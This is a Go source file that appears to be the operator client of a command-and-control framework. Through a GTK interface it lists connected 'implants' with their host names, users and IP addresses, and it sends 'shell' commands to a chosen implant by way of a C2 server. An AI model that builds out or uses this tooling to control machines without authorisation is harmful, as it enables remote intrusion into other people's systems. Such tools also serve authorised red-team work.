package Client

import (
	"Operator/Common"
	"sync"
	"fmt"
	"encoding/json"
	"io/ioutil"
	"bytes"
    "encoding/base64"
	"strings"
	"time"
	"net/http"
	"github.com/gotk3/gotk3/gtk"
)

const (
    operatorID = "123abc" // Will later be used with authentication
)

type Command struct {
    Group    string `json:"Group"`
    String   string `json:"String"`
    Response string `json:"Response"`
}

type Connections map[string]ConnectionDetails

type ConnectionDetails struct {
	HostVersion string `json:"HostVersion"`
	AgentType   string `json:"AgentType"`
	ImplantID   string `json:"ImplantID"`
	InternalIP  string `json:"InternalIP"`
	ExternalIP  string `json:"ExternalIP"`
	User        string `json:"User"`
	HostName    string `json:"HostName"`
	LastSeen    string `json:"LastSeen"`
	FullHash    string `json:"FullHash"`
	OrgUID      string `json:"OrgUID"`
}

var ConnectionLog = Connections{}

var cur Common.CurrentTab

var ID_Set bool
var response string

var port string
var defaultPort = "8443"

var routeMutex sync.Mutex 

func ServerConnection() {
	fmt.Println("serverconnection")
    if Common.ServerURL == "" {
        defaultIP, err := getIP()
        if err != nil {
            Text := "Failed to set an address for the server"
            Common.InsertLogMarkup(Text)
        }
        port = defaultPort
        url := "http://" + defaultIP + ":" + port
		Common.ServerURL = url
    }

	go func() {
		var status bool
		if verifyServerUp(Common.ServerURL) {
			Text := "<span>Connected to server: <span foreground=\"" + Common.AllWhite + "\">" + Common.ServerURL + "</span></span>" + "\n"
			Common.InsertLogMarkup(Text)
			status = true
		} else {
			Text := "<span foreground=\"" + Common.BrightRed + "\">Unable to connect to server: <span foreground=\"" + Common.AllWhite + "\">" + Common.ServerURL + "</span></span>" + "\n"
			Common.InsertLogMarkup(Text)
			status = false
		}
		for {
			if !status {
				if verifyServerUp(Common.ServerURL) {
					Text := "<span>Connected to server: <span foreground=\"" + Common.AllWhite + "\">" + Common.ServerURL + "</span></span>" + "\n"
					Common.InsertLogMarkup(Text)
					status = true
				}
			} 
			if status {
				if !verifyServerUp(Common.ServerURL) {
					Text := "<span foreground=\"" + Common.BrightRed + "\">Unable to connect to server: <span foreground=\"" + Common.AllWhite + "\">" + Common.ServerURL + "</span></span>" + "\n"
					Common.InsertLogMarkup(Text)
					status = false
				}
			}
			time.Sleep(1 * time.Second)
		}
	}()
}

func UpdateLog() { 
	for {
		fmt.Println("updatelog")
		cmdGroup := "log"
		cmdString := ""
		responseChan := make(chan string)
		go func() {
			ServerCommand(cmdGroup, cmdString, responseChan)
		}()
		// Wait for the response or timeout
		select {
		case base64Log := <-responseChan:
			if base64Log != "" {
				var updatedLog map[string]ConnectionDetails
				byteData, _ := base64.StdEncoding.DecodeString(base64Log)
				if err := json.Unmarshal(byteData, &updatedLog); err != nil {
					return
				}

				for key, connectionDetails := range updatedLog {
                    if existingConnection, exists := ConnectionLog[key]; exists {
                        existingConnection.LastSeen = connectionDetails.LastSeen
                        ConnectionLog[key] = existingConnection
						Common.UpdateRow(key, existingConnection.LastSeen)
					} else {
						text := "New connection" + " " + key + "\n"
						Common.InsertLogMarkup(text)
						ConnectionLog[key] = connectionDetails
						data := []string{connectionDetails.HostVersion, connectionDetails.AgentType, connectionDetails.ImplantID, connectionDetails.HostName, connectionDetails.User, connectionDetails.InternalIP, connectionDetails.ExternalIP, connectionDetails.LastSeen}
						Common.CreateRow(data)
					}
				}
				// Override ConnectionLog with updatedLog
				ConnectionLog = updatedLog
			}
		case <-time.After(2 * time.Second):
		}
		time.Sleep(2 * time.Second)
	}
}

func RouteCMD(input string, responseChan chan<- string) {
	fmt.Println("routecmd")
	var sort Common.Sorting

	buffer := Common.CT.CurrentBuffer

	sort.SortingMutex.Lock()
    defer sort.SortingMutex.Unlock()
	// Trim spaces and newline characters from the input
	input = strings.TrimSpace(input)
	
	// Parse the input command
	parts := strings.Fields(input)
	if len(parts) < 2 {
		output := "Invalid command. Please provide a command group and a command.\n"
		warn := true
		Common.CT.CurrentMutex.Lock()
		defer Common.CT.CurrentMutex.Unlock()
		Common.ConsoleAlerts(output, buffer, warn)
		return
	}

	cmdGroup := parts[0]
	switch cmdGroup {
	case "shell":
		sort.ImplantCmd = true
		
	default:
		output := "Invalid command group\n"
		warn := true
		Common.CT.CurrentMutex.Lock()
		defer Common.CT.CurrentMutex.Unlock()
		Common.ConsoleAlerts(output, buffer, warn)
		return
	}
	cmdString := strings.Join(parts[1:], " ")

	if sort.ImplantCmd {
		Common.CT.CurrentMutex.Lock()
		defer Common.CT.CurrentMutex.Unlock()
		err := ImplantCommand(cmdGroup, cmdString, responseChan, Common.CT.CurrentBuffer, Common.CT.CurrentID)
		if err != nil {
			output := fmt.Sprintf("Error sending command: %v\n", err)
			warn := true
			Common.ConsoleAlerts(output, buffer, warn)
			return
		}
	}
	
	if sort.ServerCmd {
		
		err := ServerCommand(cmdGroup, cmdString, responseChan)
		if err != nil {
			output := fmt.Sprintf("Error sending command: %v\n", err)
			warn := true
			Common.CT.CurrentMutex.Lock()
			defer Common.CT.CurrentMutex.Unlock()
			Common.ConsoleAlerts(output, buffer, warn)
			return
		}
	}
}

func ImplantCommand(cmdGroup, cmdString string, CommandChan chan<- string, buffer *gtk.TextBuffer, implantID string) error {
	fmt.Println("implantcmd")
	endpoint := "/operator"
	server := Common.ServerURL + endpoint
	client := &http.Client{}

	commandURL := server

	cmdData := Command{
		Group:   cmdGroup,
		String:  cmdString,
		Response: "", 
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Send request to server
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
	// Serialize command data to JSON
	jsonData, err := json.Marshal(cmdData)
	if err != nil {
		return fmt.Errorf("error marshaling JSON data: %w", err)
	}

	// Base64 encode the JSON data
	base64Data := base64.StdEncoding.EncodeToString(jsonData)

	// Create HTTP request
	req, err := http.NewRequest("POST", commandURL, bytes.NewBuffer([]byte(base64Data)))
	if err != nil {
		return fmt.Errorf("error creating HTTP request: %w", err)
	}
	req.Header.Set("Content-Type", "text/plain") // Set content type to text/plain
	req.Header.Set("Operator-ID", operatorID)
	req.Header.Set("Implant-ID", implantID)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return err
	} else {
		output := "Task sent to implant\n"
		warn := false
		Common.ConsoleAlerts(output, buffer, warn)
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Receive response from server
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	var responseBytes []byte
	var responseBody string
	var decodedData []byte
	for {
		// Read the response
		responseBytes, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			return fmt.Errorf("error reading response body: %w", err)
		}
		responseBody = string(responseBytes) // Convert []byte to string

		dataIndex := strings.Index(responseBody, "Data:")
		if dataIndex != -1 {
			data := strings.TrimSpace(responseBody[dataIndex+len("Data:"):])
			decodedData, err = base64.StdEncoding.DecodeString(data)
			if err != nil {
				return fmt.Errorf("error decoding base64 data: %w", err)
			}
		} else {
			output := "No data found in the response\n"
			warn := true
			Common.ConsoleAlerts(output, buffer, warn)
		}
		if len(responseBody) > 0 {
			output := "Received ouput\n"
			warn := false
			Common.ConsoleAlerts(output, buffer, warn)
			fmt.Println("output", responseBody) // Data: +base64
			break
		}
		time.Sleep(100 * time.Millisecond)
	}

	// Unmarshal JSON
	var respstruct Command

	// Trim leading and trailing whitespace
	decodedData = bytes.TrimSpace(decodedData)

	err = json.Unmarshal(decodedData, &respstruct)
	if err != nil {
	return fmt.Errorf("Failed to unmarshal JSON: %s", err)
	}

	fmt.Println("Response", respstruct.Response)

	Common.CommandOutput(respstruct.Response, buffer)
	Common.CommandChan <- respstruct.Response // Common.CommandChan
	defer resp.Body.Close()
	return nil
}


func ServerCommand(cmdGroup, cmdString string, responseChan chan<- string) error {

	endpoint := "/info"
	server := Common.ServerURL + endpoint
	client := &http.Client{}

	commandURL := server

	cmdData := Command{
		Group:   cmdGroup,
		String:  cmdString,
		Response: "", 
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Send request to server
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
	// Serialize command data to JSON
	jsonData, err := json.Marshal(cmdData)
	if err != nil {
		return fmt.Errorf("error marshaling JSON data: %w", err)
	}

	// Base64 encode the JSON data
	base64Data := base64.StdEncoding.EncodeToString(jsonData)

	// Create HTTP request
	req, err := http.NewRequest("GET", commandURL, bytes.NewBuffer([]byte(base64Data)))
	if err != nil {
		return fmt.Errorf("error creating HTTP request: %w", err)
	}
	req.Header.Set("Content-Type", "text/plain") // Set content type to text/plain
	req.Header.Set("Operator-ID", operatorID)

	// Send request
	resp, err := client.Do(req)
	if err != nil {
		return err
	}

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		// Receive response from server
	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
		
	var responseBytes []byte
	var responseBody string
	var decodedData []byte
	for {
		// Read the response
		responseBytes, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			return fmt.Errorf("error reading response body: %w", err)
		}
		responseBody = string(responseBytes) // Convert []byte to string
	// Extract and decode data value
		dataIndex := strings.Index(responseBody, "Data:")
		if dataIndex != -1 {
			data := strings.TrimSpace(responseBody[dataIndex+len("Data:"):])
			decodedData, err = base64.StdEncoding.DecodeString(data)
			if err != nil {
				return fmt.Errorf("error decoding base64 data: %w", err)
			}
		} else {
			fmt.Println("Data not found in response")
		}
		if len(responseBody) > 0 {
			break
		}
		time.Sleep(100 * time.Millisecond) // Wait for a short duration before trying again
	}

	// Unmarshal JSON
	var respstruct Command

	// Trim leading and trailing whitespace
	decodedData = bytes.TrimSpace(decodedData)

	err = json.Unmarshal(decodedData, &respstruct)
	if err != nil {
		return fmt.Errorf("Failed to unmarshal JSON: %s", err)
	}

	responseChan <- respstruct.Response
	defer resp.Body.Close()
	return nil
}